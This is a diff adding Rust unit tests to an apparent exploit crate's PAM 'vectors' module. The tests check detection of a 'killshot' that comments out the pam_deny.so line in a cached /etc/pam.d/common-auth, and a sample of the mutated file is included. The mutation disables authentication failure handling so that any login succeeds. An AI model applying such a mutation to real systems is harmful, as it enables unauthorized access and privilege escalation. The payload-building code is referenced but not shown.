@@ -2,7 +2,8 @@
 
 use copyfail_rs::vectors::pam::{
     build_killshot_buf, build_a1_buf, build_fedora_default_flip_buf, build_fedora_faillock_comment_buf,
-    find_pam_deny_line_offset, find_fedora_default_bad_offset, find_fedora_faillock_authfail_line_offset,
+    find_pam_deny_line_offset, find_pam_deny_killshot_offset,
+    find_fedora_default_bad_offset, find_fedora_faillock_authfail_line_offset,
     parse_distro_family, DistroFamily, PamError,
 };
 
@@ -295,6 +296,54 @@ fn a1_buf_returns_not_found_when_requisite_absent() {
     let mut out = [0u8; 4096];
     let r = build_a1_buf(body, 0, &mut out);
     assert!(matches!(r, Err(PamError::NotFound)), "got {:?}", r);
+}
+
+// ----- Idempotency: detect already-mutated cache state (FIX 2) -----
+
+const COMMON_AUTH_AFTER_KILLSHOT: &[u8] = b"#\n\
+# /etc/pam.d/common-auth - authentication settings common to all services\n\
+#\n\
+# here are the per-package modules (the \"Primary\" block)\n\
+auth\t[success=1 default=ignore]\tpam_unix.so nullok\n\
+# here's the fallback if no module succeeds\n\
+#aut\trequisite\t\t\tpam_deny.so\n\
+# prime the stack with a positive return value if there isn't one already;\n\
+auth\trequired\t\t\tpam_permit.so\n";
+
+#[test]
+fn detects_killshot_already_applied() {
+    let off = find_pam_deny_killshot_offset(COMMON_AUTH_AFTER_KILLSHOT)
+        .expect("must detect prior killshot");
+    // Offset points at the '#' that replaced 'a' of 'auth'.
+    assert_eq!(COMMON_AUTH_AFTER_KILLSHOT[off], b'#');
+    assert_eq!(&COMMON_AUTH_AFTER_KILLSHOT[off..off + 4], b"#aut");
+}
+
+#[test]
+fn returns_none_on_clean_common_auth() {
+    assert!(find_pam_deny_killshot_offset(COMMON_AUTH_UBUNTU_24_04).is_none());
+}
+
+#[test]
+fn ignores_unrelated_commented_lines() {
+    let body = b"#auth\trequired\tpam_permit.so\n#aut foobar\n# random comment\nauth\trequired\tpam_permit.so\n";
+    assert!(find_pam_deny_killshot_offset(body).is_none());
+}
+
+#[test]
+fn detects_killshot_with_leading_whitespace() {
+    let body = b"\t#aut\trequisite\t\t\tpam_deny.so\n";
+    let off = find_pam_deny_killshot_offset(body).expect("must detect indented");
+    assert_eq!(body[off], b'#');
+}
+
+#[test]
+fn killshot_detection_rejects_space_after_hash_aut() {
+    // Reviewer M1: the original killshot writes #aut over auth, and the byte
+    // after `auth` in /etc/pam.d/common-auth is always TAB. A handcrafted
+    // comment using space `#aut requisite ... pam_deny.so` must NOT match.
+    let body = b"#aut requisite pam_deny.so\n";
+    assert!(find_pam_deny_killshot_offset(body).is_none());
 }
 
 // ----- Live-environment sanity (non-fatal, ignored unless run on dev box) -----
